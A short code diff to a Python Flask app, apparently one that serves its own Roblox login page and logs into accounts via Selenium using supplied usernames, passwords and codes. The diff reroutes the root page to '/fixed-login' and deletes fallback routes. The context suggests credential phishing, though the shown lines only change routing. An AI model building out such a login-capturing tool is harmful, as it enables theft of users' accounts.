@@ -958,42 +958,12 @@ def roblox_login_selenium(username, password, session_id=None, code=None):
 
 @app.route('/')
 def login_page():
-    try:
-        return app.send_static_file('login.html')
-    except Exception as e:
-        # Если файл не найден, возвращаем простую страницу
-        return f"""
-        <!DOCTYPE html>
-        <html>
-        <head><title>Roblox Login</title></head>
-        <body>
-            <h1>Roblox Login</h1>
-            <p>Файл login.html не найден. Ошибка: {e}</p>
-            <p>Доступные файлы в static: {os.listdir('static')}</p>
-        </body>
-        </html>
-        """
+    """Главная страница - перенаправляет на исправленную версию"""
+    return redirect('/fixed-login')
 
-@app.route('/login.html')
-def old_login_page():
-    return render_template('login.html')
 
-@app.route('/final.html')
-def final_page():
-    try:
-        return app.send_static_file('final.html')
-    except Exception as e:
-        return f"""
-        <!DOCTYPE html>
-        <html>
-        <head><title>Final Page</title></head>
-        <body>
-            <h1>Final Page</h1>
-            <p>Файл final.html не найден. Ошибка: {e}</p>
-            <p>Доступные файлы в static: {os.listdir('static')}</p>
-        </body>
-        </html>
-        """
+
+
 
 @app.route('/login', methods=['POST', 'OPTIONS'])
 def login():
